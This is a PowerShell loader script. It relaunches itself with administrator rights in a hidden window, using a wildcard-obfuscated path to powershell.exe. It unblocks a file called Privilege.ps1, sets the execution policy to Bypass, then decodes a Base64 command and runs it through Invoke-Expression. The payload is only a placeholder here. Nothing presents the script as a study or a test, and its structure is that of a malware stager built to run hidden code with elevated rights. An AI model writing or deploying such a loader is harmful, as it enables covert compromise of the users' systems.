
param([switch]$Elevated)

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    Unblock-File '.\Privilege.ps1'
}

if ((Test-Admin) -eq $false)  {
    if ($elevated) {
        # tried to elevate, did not work, aborting
    } else {
        Start-Process $env:Sys???r???\\SYSW????\??ndowsPowerShe??\v1.0\powershe??.exe -Verb RunAs -ArgumentList ('-noprofile -WindowStyle hidden -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
    }
    exit
}

Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
$encodedCommand = 'BASE64_ENCODED_COMMAND_HERE'
$decodedCommand = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedCommand))
Invoke-Expression $decodedCommand
